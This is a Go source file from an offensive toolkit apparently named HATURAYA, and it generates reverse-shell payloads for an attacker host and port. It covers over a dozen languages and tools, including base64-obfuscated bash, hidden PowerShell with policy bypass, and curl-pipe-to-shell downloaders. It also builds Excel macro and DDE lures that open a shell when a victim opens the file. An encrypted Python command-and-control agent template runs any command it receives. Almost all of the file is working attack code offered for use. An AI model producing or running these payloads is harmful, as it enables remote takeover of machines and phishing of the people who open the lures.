// Package payload generates reverse-shell payloads and the encrypted Go agent.
package payload

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf16"
)

// Entry is a single named payload.
type Entry struct {
	Label   string
	Payload string
}

// ShellTypes returns the set of valid shell-type strings accepted by Build.
func ShellTypes() []string {
	return []string{
		"bash", "sh", "python", "perl", "ruby", "php",
		"netcat", "socat", "openssl", "powershell", "other", "excel", "all",
	}
}

// PayloadsDir resolves the payloads directory using the env-var override or a
// path relative to the running binary.
func PayloadsDir() string {
	if d := os.Getenv("HATURAYA_PAYLOADS_DIR"); d != "" {
		return d
	}
	exe, err := os.Executable()
	if err != nil {
		return filepath.Join("web_app", "payloads")
	}
	return filepath.Join(filepath.Dir(exe), "..", "web_app", "payloads")
}

// psB64 encodes a PowerShell one-liner as UTF-16LE base64 for -EncodedCommand.
func psB64(cmd string) string {
	runes := []rune(cmd)
	codes := utf16.Encode(runes)
	buf := make([]byte, len(codes)*2)
	for i, v := range codes {
		buf[i*2] = byte(v)
		buf[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// Build generates all reverse-shell payload categories for the given target.
// webPort may be empty; it is used only for URLs referencing the web server.
func Build(lhost, lport, webPort string) map[string][]Entry {
	web := fmt.Sprintf("http://%s:%s", lhost, webPort)
	if webPort == "" {
		web = fmt.Sprintf("http://%s:9090", lhost)
	}

	// ── BASH ──────────────────────────────────────────────────────────────────
	bashPlain := fmt.Sprintf("/bin/bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	bashC := fmt.Sprintf("bash -c '/bin/bash -i >& /dev/tcp/%s/%s 0>&1'", lhost, lport)
	bash := []Entry{
		{"Direct TCP", bashPlain},
		{"Bash -c", bashC},
		{"Named pipe + nc", fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f", lhost, lport)},
		{"File descriptor", fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%s; /bin/bash <&196 >&196 2>&196", lhost, lport)},
		{"URL-encoded", fmt.Sprintf("%%2Fbin%%2Fbash%%20-i%%20%%3E%%26%%20%%2Fdev%%2Ftcp%%2F%s%%2F%s%%200%%3E%%261", lhost, lport)},
		{"Base64", base64.StdEncoding.EncodeToString([]byte(bashC))},
		{"Obfuscated var-split", fmt.Sprintf("h=%s;p=%s;bash -i >/dev/tcp/$h/$p 0>&1 2>&1", lhost, lport)},
		{"Obfuscated eval+b64", fmt.Sprintf("eval $(echo %s|base64 -d)", base64.StdEncoding.EncodeToString([]byte(bashPlain)))},
	}

	// ── SH ────────────────────────────────────────────────────────────────────
	shPlain := fmt.Sprintf("sh -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	shC := fmt.Sprintf("sh -c '/bin/sh -i >& /dev/tcp/%s/%s 0>&1'", lhost, lport)
	sh := []Entry{
		{"Direct", shPlain},
		{"sh -c", shC},
		{"Named pipe + nc", fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport)},
		{"File descriptor", fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%s; /bin/sh <&196 >&196 2>&196", lhost, lport)},
		{"Obfuscated eval", fmt.Sprintf("eval $(echo %s|base64 -d)", base64.StdEncoding.EncodeToString([]byte(shPlain)))},
	}

	// ── PYTHON ────────────────────────────────────────────────────────────────
	py := []Entry{
		{"PTY spawn", fmt.Sprintf(
			"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn(\"/bin/bash\")'",
			lhost, lport)},
		{"subprocess", fmt.Sprintf(
			"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"%s\",%s));subprocess.call([\"/bin/bash\",\"-i\"],stdin=s,stdout=s,stderr=s)'",
			lhost, lport)},
		{"dup2 + os.system", fmt.Sprintf(
			"python3 -c 'import socket,os;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),x) for x in(0,1,2)];os.system(\"/bin/bash -i\")'",
			lhost, lport)},
		{"Threaded", fmt.Sprintf(
			"python3 -c 'import socket,subprocess,threading;s=socket.socket();s.connect((\"%s\",%s));p=subprocess.Popen([\"/bin/bash\"],stdin=s,stdout=s,stderr=s);p.wait()'",
			lhost, lport)},
		{"Encrypted agent (AES+Auth)", fmt.Sprintf("curl %s/payloads/agent.py | python3", web)},
		{"Encrypted agent (save+run)", fmt.Sprintf("curl %s/payloads/agent.py -O /tmp/agent.py && python3 /tmp/agent.py", web)},
	}

	// ── PERL ──────────────────────────────────────────────────────────────────
	perl := []Entry{
		{"Socket", fmt.Sprintf(
			"perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
			lhost, lport)},
		{"IO::Socket", fmt.Sprintf(
			"perl -MIO -e '$p=fork;exit,if $p;$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system $_ while<>;'",
			lhost, lport)},
	}

	// ── RUBY ──────────────────────────────────────────────────────────────────
	ruby := []Entry{
		{"TCPSocket exec", fmt.Sprintf(
			"ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/bash -i <&%%d >&%%d 2>&%%d\",f,f,f)'",
			lhost, lport)},
		{"fork + gets loop", fmt.Sprintf(
			"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
			lhost, lport)},
		{"spawn", fmt.Sprintf(
			"ruby -rsocket -e 's=TCPSocket.new(\"%s\",%s);spawn(\"/bin/bash\",$stdin=>s,$stdout=>s,$stderr=>s)'",
			lhost, lport)},
	}

	// ── PHP ───────────────────────────────────────────────────────────────────
	php := []Entry{
		{"fsockopen exec", fmt.Sprintf(
			"php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
			lhost, lport)},
		{"proc_open", fmt.Sprintf(
			"php -r '$sock=fsockopen(\"%s\",%s);$proc=proc_open(\"/bin/bash\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
			lhost, lport)},
		{"shell_exec loop", fmt.Sprintf(
			"php -r '$s=fsockopen(\"%s\",%s);while(!feof($s)){$b=fgets($s,2048);$o=shell_exec($b);fputs($s,$o);}'",
			lhost, lport)},
		{"passthru", fmt.Sprintf(
			"php -r '$s=fsockopen(\"%s\",%s);while($c=fgets($s)){ob_start();passthru($c);$o=ob_get_clean();fwrite($s,$o);}'",
			lhost, lport)},
	}

	// ── NETCAT ────────────────────────────────────────────────────────────────
	nc := []Entry{
		{"nc -e", fmt.Sprintf("nc -e /bin/bash %s %s", lhost, lport)},
		{"nc -c", fmt.Sprintf("nc -c bash %s %s", lhost, lport)},
		{"nc mkfifo", fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;nc %s %s </tmp/f|/bin/bash >/tmp/f 2>&1", lhost, lport)},
		{"ncat -e", fmt.Sprintf("ncat -e /bin/bash %s %s", lhost, lport)},
		{"ncat UDP", fmt.Sprintf("ncat --udp %s %s -e /bin/bash", lhost, lport)},
		{"busybox nc", fmt.Sprintf("busybox nc %s %s -e /bin/bash", lhost, lport)},
	}

	// ── SOCAT ─────────────────────────────────────────────────────────────────
	socat := []Entry{
		{"PTY (interactive)", fmt.Sprintf("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s", lhost, lport)},
		{"exec", fmt.Sprintf("socat tcp-connect:%s:%s exec:/bin/bash,pty,stderr,setsid", lhost, lport)},
		{"UDP", fmt.Sprintf("socat udp-connect:%s:%s exec:/bin/bash,pty,stderr,setsid", lhost, lport)},
	}

	// ── OPENSSL ───────────────────────────────────────────────────────────────
	openssl := []Entry{
		{"1. C2 setup (run first)", fmt.Sprintf(
			"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=C2' && openssl s_server -quiet -key key.pem -cert cert.pem -port %s",
			lport)},
		{"2. Target mkfifo", fmt.Sprintf(
			"mkfifo /tmp/s; /bin/bash -i </tmp/s 2>&1 | openssl s_client -quiet -connect %s:%s >/tmp/s; rm /tmp/s",
			lhost, lport)},
		{"2. Target (alt)", fmt.Sprintf(
			"openssl s_client -quiet -connect %s:%s|bash 2>&1|openssl s_client -quiet -connect %s:%s",
			lhost, lport, lhost, lport)},
	}

	// ── POWERSHELL ────────────────────────────────────────────────────────────
	psCmd := strings.Join([]string{
		fmt.Sprintf("$c=New-Object Net.Sockets.TCPClient('%s',%s);", lhost, lport),
		"$s=$c.GetStream();",
		"[byte[]]$b=0..65535|%{0};",
		"while(($i=$s.Read($b,0,$b.Length))-ne 0){",
		"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);",
		"$r=(iex $d 2>&1|Out-String);",
		"$r2=$r+'PS '+(pwd).Path+'> ';",
		"$sb=([text.encoding]::ASCII).GetBytes($r2);",
		"$s.Write($sb,0,$sb.Length);$s.Flush()};",
		"$c.Close()",
	}, "")
	psEncoded := psB64(psCmd)
	ps := []Entry{
		{"TCP Client", fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"%s\"", psCmd)},
		{"Base64 encoded", fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand %s", psEncoded)},
		{"IEX download", fmt.Sprintf("IEX(New-Object Net.WebClient).DownloadString('%s/payloads/agent.py')", web)},
		{"cmd.exe", fmt.Sprintf("cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand %s", psEncoded)},
	}

	// ── OTHER ─────────────────────────────────────────────────────────────────
	other := []Entry{
		{"awk", fmt.Sprintf(
			"awk 'BEGIN{s=\"/inet/tcp/0/%s/%s\";while(1){do{printf \"\" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!=\"exit\");close(s)}}'",
			lhost, lport)},
		{"nodejs", fmt.Sprintf(
			"node -e 'var n=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/bash\",[]);var c=new n.Socket();c.connect(%s,\"%s\",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});'",
			lport, lhost)},
		{"lua", fmt.Sprintf(
			"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/bash -i <&3 >&3 2>&3');\"",
			lhost, lport)},
		{"golang", fmt.Sprintf(
			"echo 'package main;import(\"net\";\"os/exec\");func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go",
			lhost, lport)},
		{"telnet", fmt.Sprintf(
			"TF=$(mktemp -u);mkfifo $TF && telnet %s %s 0<$TF | /bin/bash 1>$TF",
			lhost, lport)},
		{"curl+sh", fmt.Sprintf("curl %s/payloads/lse.sh | bash", web)},
	}

	// ── EXCEL / OFFICE ────────────────────────────────────────────────────────
	excel := []Entry{
		{
			"XLSM — XLM macro (open → Enable Macros → shell)",
			fmt.Sprintf(
				"curl \"%s/payloads/payload.xlsm\" -o report.xlsm\n  # Windows: open report.xlsm → click \"Enable Macros\" → reverse shell fires",
				web),
		},
		{
			"DDE CSV (open → Enable Editing → shell)",
			fmt.Sprintf(
				"curl \"%s/payloads/excel.csv?lhost=%s&lport=%s\" -o report.csv\n  # Windows Excel: open report.csv → Enable Editing → shell arrives",
				web, lhost, lport),
		},
		{
			"MHTML XLS (open → Enable Editing → shell)",
			fmt.Sprintf(
				"curl \"%s/payloads/excel.xls?lhost=%s&lport=%s\" -o Q1_Report.xls\n  # Windows Excel: open Q1_Report.xls → Enable Editing → shell arrives",
				web, lhost, lport),
		},
		{
			"VBA macro text (import into VBA editor)",
			fmt.Sprintf(
				"curl \"%s/payloads/macro.vba?lhost=%s&lport=%s\" -o macro.vba\n  # Excel: Alt+F11 → File → Import File → select macro.vba → run Auto_Open",
				web, lhost, lport),
		},
		{
			"Direct XLSM download URL",
			fmt.Sprintf("%s/payloads/payload.xlsm", web),
		},
	}

	return map[string][]Entry{
		"BASH":       bash,
		"SH":         sh,
		"PYTHON":     py,
		"PERL":       perl,
		"RUBY":       ruby,
		"PHP":        php,
		"NETCAT":     nc,
		"SOCAT":      socat,
		"OPENSSL":    openssl,
		"POWERSHELL": ps,
		"OTHER":      other,
		"EXCEL":      excel,
	}
}

// agentTemplate is the encrypted Python agent source, with placeholders.
const agentTemplate = `import socket,subprocess,sys,os,struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
KEY=bytes.fromhex('KEY_HEX')
AUTH=b'HATURAYA_AUTH_v1'
OK=b'HATURAYA_OK_v1'
def enc(d):
    n=os.urandom(12);return n+AESGCM(KEY).encrypt(n,d,None)
def dec(d):
    return AESGCM(KEY).decrypt(d[:12],d[12:],None)
def ra(s,n):
    d=b''
    while len(d)<n:d+=s.recv(n-len(d))
    return d
def send(s,d):
    p=enc(d);s.sendall(struct.pack('>I',len(p))+p)
def recv(s):
    l=struct.unpack('>I',ra(s,4))[0];return dec(ra(s,l))
s=socket.socket()
try:
    s.connect(('LHOST',LPORT))
    send(s,AUTH)
    if recv(s)!=OK:sys.exit(1)
    while True:
        cmd=recv(s).decode()
        if cmd in('exit','quit'):break
        r=subprocess.run(cmd,shell=True,capture_output=True,cwd=os.getcwd())
        send(s,(r.stdout+r.stderr)or b'[no output]')
except:pass
finally:s.close()
`

// WriteAgent writes the encrypted AES-GCM Python agent to payloadsDir/agent.py.
func WriteAgent(lhost, lport, keyHex, payloadsDir string) error {
	src := agentTemplate
	src = strings.ReplaceAll(src, "KEY_HEX", keyHex)
	src = strings.ReplaceAll(src, "LHOST", lhost)
	src = strings.ReplaceAll(src, "LPORT", lport)
	if err := os.MkdirAll(payloadsDir, 0o755); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(payloadsDir, "agent.py"), []byte(src), 0o644)
}
